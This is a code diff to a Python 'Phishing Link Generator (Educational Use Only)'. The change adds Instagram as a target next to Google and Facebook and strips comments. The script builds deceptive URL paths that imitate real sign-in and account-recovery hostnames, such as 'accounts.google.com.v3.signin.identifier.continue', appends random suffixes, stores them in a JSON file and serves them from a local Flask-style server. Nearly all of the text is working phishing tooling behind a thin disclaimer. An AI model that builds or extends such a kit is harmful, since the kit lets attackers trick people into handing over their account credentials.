@@ -5,15 +5,12 @@ import subprocess
 import argparse
 import os
 
-# Path to the JSON file storing randomized paths
 PATHS_FILE = "randomized_paths.json"
 
-# Generate random URL paths
 def generate_random_path(prefix):
     random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
     return f"{prefix}-{random_suffix}"
 
-# Save randomized paths to a JSON file
 def save_randomized_path(random_path, target):
     if os.path.exists(PATHS_FILE):
         with open(PATHS_FILE, "r") as file:
@@ -26,21 +23,21 @@ def save_randomized_path(random_path, target):
     with open(PATHS_FILE, "w") as file:
         json.dump(paths, file)
 
-# Generate phishing link
 def generate_phishing_link(target):
-    # Create a random path based on the target
-    prefix = "accounts.google.com.v3.signin.identifier.continue" if target.lower() == "google" else "www.facebook.com.login.php"
+    if target.lower() == "google":
+        prefix = "accounts.google.com.v3.signin.identifier.continue"
+    elif target.lower() == "instagram":
+        prefix = "instagram.com.account.recovery.signin"
+    else:
+        prefix = "www.facebook.com.login.php"
     random_path = generate_random_path(prefix)
 
-    # Save the path to the JSON file
     save_randomized_path(random_path, target)
 
-    # Generate the link
     link = f"http://127.0.0.1:5000/{random_path}"
     return link
 
 def main():
-    # Define CLI arguments
     parser = argparse.ArgumentParser(description="Phishing Link Generator (Educational Use Only)")
     parser.add_argument(
         "--target",
@@ -54,7 +51,6 @@ def main():
     )
     args = parser.parse_args()
 
-    # Generate the phishing link
     phishing_link = generate_phishing_link(args.target)
     print(f"Generated Link: {phishing_link}")
     if args.runserver:
